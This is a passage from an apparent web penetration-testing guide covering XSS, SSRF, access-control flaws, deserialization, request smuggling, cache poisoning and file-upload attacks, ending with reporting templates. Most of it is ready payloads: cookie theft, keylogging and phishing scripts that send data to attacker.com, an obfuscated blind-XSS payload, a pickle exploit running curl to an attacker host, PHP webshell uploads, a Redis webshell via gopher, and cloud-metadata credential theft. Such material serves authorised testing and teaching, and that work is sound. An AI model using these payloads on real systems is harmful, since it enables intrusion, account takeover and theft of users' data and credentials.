### 5.1 XSS Types

**Reflected XSS:**
User input is immediately reflected in the response without proper encoding.

```
https://target.com/search?q=<script>alert(document.domain)</script>
```

**Stored XSS:**
Payload persists server-side and executes when other users view the content.

```
POST /comment
body=<img src=x onerror=alert(document.domain)>
```

**DOM-Based XSS:**
Vulnerability exists entirely in client-side JavaScript — the payload never touches the server response.

```javascript
// Vulnerable code:
document.getElementById("output").innerHTML = location.hash.substring(1);

// Exploit:
https://target.com/page#<img src=x onerror=alert(1)>
```

**Mutation XSS (mXSS):**
Exploits browser HTML parsing quirks where the sanitized output differs from what the browser renders.

```html
<!-- Bypasses DOMPurify in certain versions -->
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
<svg><foreignObject><div><style><!--</style><img src=x onerror=alert(1)>
```

### 5.2 Context-Aware Payload Crafting

**HTML Context:**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**HTML Attribute Context:**

```html
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
" onmouseover=alert(1) "
" style="animation-name:x" onanimationstart="alert(1)
```

**JavaScript Context:**

```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\"-alert(1)}//
```

**URL Context:**

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

**CSS Context:**

```css
expression(alert(1))  /* IE only, legacy */
url('javascript:alert(1)')  /* older browsers */
/* Modern: inject via style attribute then use event handlers */
```

### 5.3 Content Security Policy (CSP) Bypass Techniques

```
# Identify CSP
curl -sI https://target.com | grep -i "content-security-policy"

# Common bypasses:

# 1. If script-src includes 'unsafe-eval'
<script>eval('alert(1)')</script>

# 2. If script-src allows a CDN with JSONP
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

# 3. If script-src allows 'self' and you can upload files
Upload a JS file → reference it via <script src="/uploads/payload.js"></script>

# 4. Base URI not restricted
<base href="https://evil.com/">
<!-- All relative script references now load from evil.com -->

# 5. CSP with strict-dynamic (nonce bypass via DOM gadget)
<!-- If you find a script with the nonce that does: -->
<!-- element.innerHTML = userInput -->
<!-- Then your injected HTML inherits the nonce trust -->

# 6. AngularJS CSP bypass (if angular is allowed)
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

# 7. If object-src is not restricted
<object data="data:text/html,<script>alert(1)</script>">
```

### 5.4 Filter Evasion

```html
<!-- Case manipulation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#106;avascript:alert(1)">click</a>
<img src=x onerror=alert(1)>

<!-- Null bytes (legacy) -->
<scr%00ipt>alert(1)</script>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Tag manipulation -->
<svg/onload=alert(1)>
<svg	onload=alert(1)>
<svg
onload=alert(1)>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror=throw/a]alert/.source,1>
<img src=x onerror=location='javascript:alert(1)'>

<!-- Without alert -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=top[/al/.source+/ert/.source](1)>
```

### 5.5 Advanced XSS Exploitation

**Session Hijacking:**

```javascript
// Steal cookies (if HttpOnly is not set)
<script>
new Image().src='https://attacker.com/steal?c='+document.cookie;
</script>

// Steal via fetch
<script>
fetch('https://attacker.com/log',{method:'POST',body:document.cookie});
</script>
```

**Keylogger:**

```javascript
<script>
document.addEventListener('keypress', function(e) {
  new Image().src='https://attacker.com/keys?k='+e.key;
});
</script>
```

**Phishing (credential harvesting):**

```javascript
<script>
document.body.innerHTML='<h2>Session Expired</h2><form action=https://attacker.com/phish method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>';
</script>
```

**Exfiltrate page content (bypass HttpOnly via DOM):**

```javascript
<script>
fetch('/api/user/profile').then(r=>r.text()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:d}));
</script>
```

### 5.6 Blind XSS

Blind XSS targets admin panels, support tickets, log viewers, and email content that the attacker never sees rendered.

**Payload for blind XSS with external callback:**

```html
"><script src=https://your-xss-hunter-domain.com/probe.js></script>
"><img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8veW91ci1jYWxsYmFjay5jb20/Yz0nK2RvY3VtZW50LmNvb2tpZSsnJmQ9Jytkb2N1bWVudC5kb21haW4rJyZ1PScrZG9jdW1lbnQuVVJMKQ=='))>
```

**Common blind XSS injection points:**
- Contact/support forms (rendered in agent dashboard)
- User-Agent header (logged in admin analytics)
- Referrer header (log viewers)
- Username during registration (admin user management page)
- File upload filename (file manager views)
- Error messages stored in monitoring dashboards

---

## 6. Server-Side Request Forgery (SSRF)

### 6.1 Basic SSRF / Blind SSRF

**Basic SSRF (response returned to attacker):**

```
# URL parameter SSRF
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Image URL SSRF
POST /profile/avatar
{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# PDF generator SSRF
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```

**Blind SSRF (no response visible — detect via timing or out-of-band):**

```
# DNS-based detection
https://target.com/proxy?url=http://unique-id.burpcollaborator.net

# Time-based detection
https://target.com/proxy?url=http://10.0.0.1:22  # SSH banner delay
https://target.com/proxy?url=http://10.0.0.1:1   # Connection refused = fast
# Timing difference reveals internal port state
```

### 6.2 Bypassing URL Parsers

**IP Obfuscation:**

```
# Decimal IP
http://2130706433        # = 127.0.0.1
http://0x7f000001        # Hex
http://017700000001      # Octal
http://127.1             # Short form
http://127.0.0.1.nip.io # DNS that resolves to 127.0.0.1
http://0                 # = 0.0.0.0

# IPv6
http://[::1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:7f00:1]

# URL parsing confusion
http://evil.com@127.0.0.1  # Basic auth trick
http://127.0.0.1#@evil.com
http://127.0.0.1%2523@evil.com
http://127.1:80\@evil.com
```

**DNS Rebinding:**

```
1. Attacker controls DNS for evil.com
2. First resolution: evil.com → attacker IP (passes allowlist check)
3. TTL = 0
4. Application makes request, DNS resolves again
5. Second resolution: evil.com → 127.0.0.1 (internal)
6. Application connects to internal service

# Tools: singularity, rbndr.us, rebinder
```

**Redirect Chains:**

```
# If target follows redirects:
https://target.com/fetch?url=https://attacker.com/redirect

# attacker.com/redirect responds:
# HTTP 302 Location: http://169.254.169.254/latest/meta-data/
```

### 6.3 Protocol Smuggling

**Gopher Protocol (powerful for internal service exploitation):**

```
# Redis command execution via gopher
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%2F%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT

# SMTP via gopher (send email)
gopher://127.0.0.1:25/_HELO%20evil%0D%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0ARCPT%20TO%3A%3Cadmin%40target.com%3E%0D%0ADATA%0D%0ASubject%3A%20Test%0D%0A%0D%0ASSRF%20email%0D%0A.%0D%0AQUIT

# MySQL via gopher (complex but documented in gopherus tool)
python3 gopherus.py --exploit mysql
```

**File Protocol:**

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///var/www/html/config.php
```

**Dict Protocol:**

```
dict://127.0.0.1:6379/CONFIG+SET+dir+/var/www/html
dict://127.0.0.1:11211/stats  # Memcached info
```

### 6.4 Cloud Metadata Exploitation

**AWS IMDS v1:**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**AWS IMDS v2 (requires token — harder but not impossible via SSRF):**

```bash
# Step 1: Get token (requires PUT with header — hard via basic SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl "http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: $TOKEN"

# Bypass: If SSRF allows header injection or gopher protocol, IMDSv2 can still be exploited
```

**GCP Metadata:**

```
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/attributes/
# Requires header: Metadata-Flavor: Google
# But some SSRF vectors allow header injection

# Legacy endpoint (no header required):
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

**Azure IMDS:**

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### 6.5 SSRF to RCE Chains

```
1. SSRF → Redis SLAVEOF → Write webshell
2. SSRF → AWS metadata → Credentials → S3/Lambda code execution
3. SSRF → Internal Jenkins → Job execution → RCE
4. SSRF → Internal Docker API → Container creation with host mount
5. SSRF → Kubernetes API → Pod creation → Node access
6. SSRF → Internal Elasticsearch → Script execution (_search with painless)
7. SSRF → Memcached → Deserialization gadget injection → RCE
```

### 6.6 SSRF in Specific Contexts

**PDF Generators (wkhtmltopdf, Puppeteer, WeasyPrint):**

```html
<!-- Injected in HTML that gets rendered to PDF -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="1000" height="1000"></iframe>
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
<img src="http://169.254.169.254/latest/meta-data/">

<!-- JavaScript-based exfiltration in headless browser PDF generation -->
<script>
  x = new XMLHttpRequest();
  x.open("GET","http://169.254.169.254/latest/meta-data/iam/security-credentials/",false);
  x.send();
  document.write(x.responseText);
</script>
```

**Image Processors (ImageMagick):**

```
# SVG with SSRF
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" height="200" width="200"/>
</svg>

# ImageMagick delegate (if converting SVG/MVG)
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/|ls -la'
pop graphic-context
```

**Webhooks:**

```
# Webhook URL typically user-controlled
POST /settings/webhook
{"url": "http://169.254.169.254/latest/meta-data/"}

# The application will POST data to this URL
# Response might be logged or visible in webhook delivery status
```

---

## 7. Business Logic and Access Control

### 7.1 IDOR — Insecure Direct Object Reference

**Enumeration:**

```bash
# Sequential ID enumeration
for i in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer $TOKEN" "https://target.com/api/users/$i" \
    -o "user_$i.json" -w "%{http_code}\n"
done

# UUID prediction (if sequential UUIDs are generated)
# v1 UUIDs contain timestamp — predict adjacent UUIDs

# IDOR in file downloads
https://target.com/documents/download?id=1001
https://target.com/invoices/INV-001.pdf → INV-002.pdf
```

**Common IDOR locations:**
- `/api/users/{id}` — view other users' profiles
- `/api/orders/{id}` — access other users' orders
- `/api/messages/{id}` — read private messages
- `/api/documents/{id}/download` — download restricted files
- Password reset tokens: `/reset?token=SEQUENTIAL_VALUE`

### 7.2 Horizontal and Vertical Privilege Escalation

**Horizontal (same role, different user):**

```http
# Change user_id in request body
POST /api/profile/update
{"user_id": "victim_id", "email": "attacker@evil.com"}

# Change user reference in cookie (if not cryptographically bound)
Cookie: user_id=1234  →  Cookie: user_id=5678
```

**Vertical (lower role accessing higher role functions):**

```http
# Access admin endpoints directly
GET /admin/users HTTP/1.1
Authorization: Bearer regular_user_token

# Modify role in registration/update
POST /api/register
{"username": "attacker", "password": "pass", "role": "admin"}

POST /api/profile
{"role": "administrator", "is_admin": true}

# HTTP method override
GET /admin/delete-user/123 → blocked
POST /admin/delete-user/123 → blocked
X-HTTP-Method-Override: DELETE → might bypass
```

### 7.3 Parameter Tampering

```http
# Price manipulation
POST /checkout
{"item_id": 1, "quantity": 1, "price": 0.01}  # Client-side price

# Discount code stacking
POST /apply-discount
{"codes": ["SAVE10", "SAVE10", "SAVE10", "SAVE10"]}

# Negative quantity
POST /cart/update
{"item_id": 1, "quantity": -5}  # Negative = credit?

# Hidden parameter override
POST /transfer
{"from_account": "attacker", "to_account": "victim", "amount": 100, "approved": true}
```

### 7.4 Race Conditions

**TOCTOU (Time of Check to Time of Use):**

```python
#!/usr/bin/env python3
"""race_condition_tester.py — Test for race conditions in concurrent requests."""

import asyncio
import httpx


async def exploit_race_condition():
    """Send multiple requests simultaneously to exploit race window."""
    target = "https://target.com/api/redeem-coupon"
    headers = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
    payload = {"coupon_code": "ONETIME50"}

    async with httpx.AsyncClient() as client:
        # Create many coroutines that will fire simultaneously
        tasks = [
            client.post(target, json=payload, headers=headers)
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)

    success_count = sum(1 for r in responses if r.status_code == 200)
    print(f"[*] Successful redemptions: {success_count}")
    if success_count > 1:
        print("[!] RACE CONDITION CONFIRMED — coupon redeemed multiple times")


if __name__ == "__main__":
    asyncio.run(exploit_race_condition())
```

**Limit Overrun (Burp Suite Turbo Intruder approach):**

```python
# Turbo Intruder script for Burp Suite
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)

    for i in range(50):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')  # Release all at once


def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
```

**Double-Spend:**

```
# Transfer money from account with $100 balance
# Send 5 simultaneous requests to transfer $100 each
# If balance check races with deduction, multiple succeed
```

### 7.5 Mass Assignment

```http
# User update endpoint
PUT /api/user/profile
Content-Type: application/json

{
  "name": "Normal User",
  "email": "user@target.com",
  "is_admin": true,           # Hidden field
  "role": "superadmin",       # Hidden field
  "account_balance": 999999,  # Hidden field
  "verified": true,           # Hidden field
  "permissions": ["*"]        # Hidden field
}
```

**Discovery technique:** Compare GET response fields with what the PUT/PATCH accepts. Any field returned in GET that is not in the documented update schema is a mass assignment candidate.

### 7.6 Forced Browsing

```bash
# Access resources without proper authorization flow
https://target.com/admin/
https://target.com/admin/dashboard
https://target.com/internal/reports
https://target.com/api/v1/admin/users
https://target.com/debug/
https://target.com/.env
https://target.com/backup.sql
https://target.com/api/swagger.json
https://target.com/actuator/env
https://target.com/graphql  # Without authentication
```

### 7.7 Workflow Bypass

```
# E-commerce: Skip payment step
1. Add items to cart → /cart
2. Proceed to checkout → /checkout (payment page)
3. Skip directly to → /order/confirm (order confirmation)
   Does the order process without payment?

# Multi-step form: Skip validation steps
1. /apply/step1 (personal info)
2. /apply/step2 (verification)
3. /apply/step3 (submit)
   Can you POST directly to step3 without completing step1 and step2?

# Account verification bypass
1. Register account
2. Skip email verification
3. Access authenticated features — is verification enforced server-side?
```

### 7.8 API-Level Access Control Testing

```bash
# Test HTTP method override
curl -X GET "https://target.com/api/admin/users" -H "X-HTTP-Method-Override: GET"
curl -X POST "https://target.com/api/admin/users" -H "X-HTTP-Method: DELETE"

# Test with different content types
curl "https://target.com/api/data" -H "Content-Type: application/xml"
curl "https://target.com/api/data" -H "Content-Type: application/json"

# API version rollback
https://target.com/api/v3/users/1 → 403 Forbidden
https://target.com/api/v1/users/1 → 200 OK (old version lacks auth)

# Verb tampering
GET  /api/admin/settings → 403
HEAD /api/admin/settings → 200 (with response headers leaking data)
OPTIONS /api/admin/settings → 200 (reveals allowed methods)
```

---

## 8. Advanced Exploitation

### 8.1 Deserialization Attacks

**Java (ysoserial):**

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# Common gadget chains:
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1 (Apache Commons Beanutils)
# Spring1, Spring2 (Spring Framework)
# Hibernate1 (Hibernate ORM)
# Groovy1 (Apache Groovy)
# JRMPClient (Java RMI)

# Detection: Look for these in requests/responses:
# Base64 starting with rO0AB (Java serialized object)
# Content-Type: application/x-java-serialized-object
# ViewState parameters in JSF applications
# Cookie values with base64-encoded Java objects
```

**PHP:**

```php
// Vulnerable code: unserialize() on user input
// POP chain exploitation

// Gadget example:
class FileDelete {
    public $filename;
    function __destruct() {
        unlink($this->filename);  // Arbitrary file delete
    }
}

// Payload:
// O:10:"FileDelete":1:{s:8:"filename";s:11:"/etc/passwd";}

// Phar deserialization (file operation triggers unserialize):
// Upload a .phar file disguised as image
// Trigger via: phar:///uploads/evil.phar/test.txt
// Any file operation on phar:// path triggers metadata deserialization
```

**Python (pickle):**

```python
import pickle
import os
import base64


class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/$(whoami)",))


payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Payload: {payload}")

# Detection: Base64-decoded data starting with \x80 (pickle protocol)
# Common in: Flask session cookies, Django cache, Celery task serialization
```

**.NET:**

```bash
# ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -o base64 -c "whoami"

# Detection:
# __VIEWSTATE parameters (ASP.NET)
# Base64 blobs in cookies or hidden fields
# BinaryFormatter usage (very dangerous)

# LosFormatter payload for ViewState:
ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "powershell -enc BASE64CMD"
```

### 8.2 Prototype Pollution

```javascript
// Server-side (Node.js)
// Vulnerable: recursive merge without prototype check
// merge(target, source) where source is attacker-controlled JSON

// Payload:
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// If the app later checks: if (user.isAdmin) → true for ALL objects

// Client-side prototype pollution to XSS:
// If a library reads Object.prototype properties for config:
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"source": "alert(1)", "url": "javascript:alert(1)"}}
{"__proto__": {"href": "javascript:alert(1)"}}

// Detection via URL parameters:
https://target.com/page?__proto__[test]=polluted
https://target.com/page?constructor.prototype.test=polluted
// Then check: Object.prototype.test in DevTools console
```

### 8.3 HTTP Request Smuggling

**CL.TE (Front-end uses Content-Length, back-end uses Transfer-Encoding):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL (Front-end uses Transfer-Encoding, back-end uses Content-Length):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**TE.TE (Both use Transfer-Encoding, but one can be obfuscated):**

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

SMUGGLED
```

**Exploitation — Bypass front-end security controls:**

```http
# Smuggle a request to an internal-only path
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10
Connection: close

x=
```

**Exploitation — Capture other users' requests:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /store-comment HTTP/1.1
Host: target.com
Content-Length: 800
Content-Type: application/x-www-form-urlencoded

comment=
```

### 8.4 Web Cache Poisoning

```http
# Unkeyed header injection
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If response includes: <script src="https://evil.com/resources/js/app.js">
# AND this response gets cached, all subsequent visitors load attacker's JS

# Common unkeyed inputs:
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Forwarded-Port

# Fat GET request
GET /page?cb=123 HTTP/1.1
Host: target.com
Content-Length: 30

param=<script>alert(1)</script>
# If body param reflects in cached response
```

### 8.5 WebSocket Vulnerabilities

```javascript
// Cross-site WebSocket hijacking (CSWSH)
// If WebSocket handshake doesn't validate Origin:
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({action: 'get_messages'}));
};
ws.onmessage = function(event) {
  fetch('https://attacker.com/steal', {method: 'POST', body: event.data});
};
</script>

// Injection via WebSocket messages
// If server processes WS messages without sanitization:
{"message": "<img src=x onerror=alert(1)>"}
{"query": "' OR 1=1-- -"}
```

### 8.6 GraphQL-Specific Attacks

**Introspection Query:**

```json
{"query": "{__schema{types{name,fields{name,type{name}}}}}"}

// Full introspection
{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}
```

**Batching Attack (bypass rate limiting):**

```json
[
  {"query": "mutation { login(user:\"admin\",pass:\"password1\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"password2\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"password3\") { token } }"}
]
```

**Nested Query DoS:**

```json
{
  "query": "{ users { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } } } }"
}
```

**Authorization bypass via field suggestion:**

```
# Query for sensitive field that returns "did you mean" suggestion
{"query": "{user{passwor}}"}
# Response: "Did you mean 'password'?"
# Reveals field names even without introspection
```

### 8.7 File Upload Exploitation

**Polyglot Files:**

```bash
# JPEG + PHP polyglot
# Start with valid JPEG header, embed PHP in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg
mv legitimate.jpg shell.php.jpg

# GIF + PHP polyglot
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# PNG + PHP
# Inject PHP into IDAT chunk that survives image processing
```

**Extension Bypass:**

```
shell.php       → blocked
shell.php5      → allowed?
shell.phtml     → allowed?
shell.pht       → allowed?
shell.php.jpg   → double extension
shell.php%00.jpg → null byte (legacy)
shell.php/.     → path traversal
shell.jpg.php   → reverse double extension
shell.PhP       → case sensitivity
shell.php::$DATA → NTFS alternate data stream (Windows)
.htaccess       → Apache configuration override
```

**Path Traversal in Filename:**

```http
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"

<?php system($_GET['cmd']); ?>
```

**Content-Type Bypass:**

```http
# Server validates Content-Type header but not actual content
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

---

## 9. Reporting and Remediation

### 9.1 Executive Summary Writing

The executive summary is written for non-technical stakeholders (C-suite, board, legal). It must:

- State the overall risk posture in one sentence
- Quantify findings by severity (Critical: X, High: Y, Medium: Z, Low: W)
- Highlight business impact (not technical details)
- Provide clear remediation priorities with estimated effort
- Be no longer than one page

**Template:**

```
EXECUTIVE SUMMARY
─────────────────
Assessment Period:    2025-03-15 to 2025-03-22
Target:              target.com web application and API
Methodology:         Gray-box penetration test per OWASP Testing Guide v4.2
Scope:               All production endpoints per RoE document dated 2025-03-01

OVERALL RISK: HIGH

During the assessment, [X] vulnerabilities were identified:
- Critical: [N] — immediate action required
- High: [N] — remediate within 7 days
- Medium: [N] — remediate within 30 days
- Low/Info: [N] — address during next development cycle

KEY FINDINGS:
1. [Critical] SQL injection in search functionality enables full database access
2. [Critical] Broken access control allows any user to access admin functions
3. [High] Stored XSS in user profiles affects all platform users

BUSINESS IMPACT:
- Unauthorized access to [N] customer records (GDPR/PCI implications)
- Potential for complete system compromise via database access
- Reputational risk if vulnerabilities are discovered by malicious actors

IMMEDIATE ACTIONS RECOMMENDED:
1. Deploy parameterized queries for all database operations (3-5 dev days)
2. Implement role-based access control checks at API layer (5-7 dev days)
3. Deploy output encoding library across all user-content rendering (2-3 dev days)
```

### 9.2 Technical Finding Format

Each finding follows a consistent structure:

```
┌─────────────────────────────────────────────────────────────────┐
│ FINDING: [VULN-001] SQL Injection in Product Search             │
├─────────────────────────────────────────────────────────────────┤
│ Severity:    CRITICAL                                           │
│ CVSS 3.1:   9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) │
│ CWE:        CWE-89 (Improper Neutralization of SQL Commands)    │
│ OWASP:      A03:2021 — Injection                                │
│ Status:     Open                                                │
├─────────────────────────────────────────────────────────────────┤
│ LOCATION                                                        │
│ URL:        https://target.com/api/products/search              │
│ Parameter:  q (GET parameter)                                   │
│ Component:  ProductController.search()                          │
├─────────────────────────────────────────────────────────────────┤
│ DESCRIPTION                                                     │
│ The search parameter is concatenated directly into a SQL query  │
│ without parameterization or input sanitization. An              │
│ unauthenticated attacker can extract the entire database        │
│ contents, modify data, or execute system commands via           │
│ xp_cmdshell (MSSQL) or LOAD_FILE/INTO OUTFILE (MySQL).         │
├─────────────────────────────────────────────────────────────────┤
│ PROOF OF CONCEPT                                                │
│                                                                 │
│ Request:                                                        │
│ GET /api/products/search?q=' UNION SELECT                       │
│   username,password,NULL,NULL FROM users-- - HTTP/1.1           │
│ Host: target.com                                                │
│                                                                 │
│ Response (200 OK):                                              │
│ {"results": [                                                   │
│   {"name": "admin", "description": "$2b$12$...hashed..."},      │
│   {"name": "john", "description": "$2b$12$...hashed..."}        │
│ ]}                                                              │
│                                                                 │
│ [Screenshot: evidence/VULN-001-sqli-poc.png]                    │
├─────────────────────────────────────────────────────────────────┤
│ IMPACT                                                          │
│ - Full database read/write access                               │
│ - Extraction of all user credentials                            │
│ - Potential OS-level command execution                           │
│ - Lateral movement to other internal systems via DB links       │
├─────────────────────────────────────────────────────────────────┤
│ REMEDIATION                                                     │
│ Priority: IMMEDIATE                                             │
│                                                                 │
│ 1. Use parameterized queries (prepared statements):             │
│    cursor.execute("SELECT * FROM products WHERE name LIKE %s",  │
│                   (f"%{query}%",))                               │
│ 2. Implement input validation (allowlist characters)            │
│ 3. Apply least-privilege DB account (no GRANT/FILE/EXECUTE)     │
│ 4. Deploy WAF rule as temporary mitigation                      │
├─────────────────────────────────────────────────────────────────┤
│ REFERENCES                                                      │
│ - https://cheatsheetseries.owasp.org/cheatsheets/               │
│   Query_Parameterization_Cheat_Sheet.html                       │
│ - https://cwe.mitre.org/data/definitions/89.html                │
└─────────────────────────────────────────────────────────────────┘
```

### 9.3 CVSS Scoring Methodology

**CVSS 3.1 Base Score Components:**

| Metric | Values | Description |
|--------|--------|-------------|
| Attack Vector (AV) | N/A/L/P | Network/Adjacent/Local/Physical |
| Attack Complexity (AC) | L/H | Low/High |
| Privileges Required (PR) | N/L/H | None/Low/High |
| User Interaction (UI) | N/R | None/Required |
| Scope (S) | U/C | Unchanged/Changed |
| Confidentiality (C) | N/L/H | None/Low/High |
| Integrity (I) | N/L/H | None/Low/High |
| Availability (A) | N/L/H | None/Low/High |

**Common Web Vulnerability CVSS Scores:**

| Vulnerability | Typical CVSS | Vector |
|--------------|-------------|--------|
| Unauthenticated RCE | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| SQL Injection (unauth) | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Stored XSS (admin target) | 8.4 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N |
| SSRF to cloud metadata | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| IDOR (data exposure) | 6.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| Reflected XSS | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| CSRF (state change) | 4.3 | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N |
| Information disclosure | 5.3 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |

### 9.4 Risk Rating Methodology

Beyond CVSS, factor in business context:

```
RISK = LIKELIHOOD × IMPACT

Likelihood Factors:
├── Skill level required (1-9, higher = less likely)
├── Motivation (is this target attractive?)
├── Opportunity (exposure, attack surface)
├── Attack vector accessibility
└── Existing security controls

Impact Factors:
├── Data sensitivity (PII, PCI, PHI, trade secrets)
├── Financial loss potential
├── Reputational damage
├── Regulatory/compliance penalties
├── Operational disruption
└── Legal liability
```

### 9.5 Remediation Verification

After the client remediates:

1. Re-test the exact reproduction steps from the original finding
2. Test for bypass variants (did they fix the symptom or the root cause?)
3. Verify the fix does not introduce new vulnerabilities
4. Test adjacent functionality for similar issues (if SQLi was found in search, test all other input points)
5. Document verification result with timestamp and evidence

### 9.6 Report Template Structure

```
1. Cover Page
   - Classification: CONFIDENTIAL
   - Client name, engagement ID
   - Assessment dates
   - Report version and date
   - Assessor name and certification

2. Table of Contents

3. Executive Summary (1 page max)

4. Scope and Methodology
   - Targets tested
   - Testing methodology (OWASP/PTES)
   - Tools used
   - Testing constraints/limitations

5. Risk Summary
   - Finding count by severity (table + chart)
   - Risk heat map

6. Detailed Findings (sorted by severity)
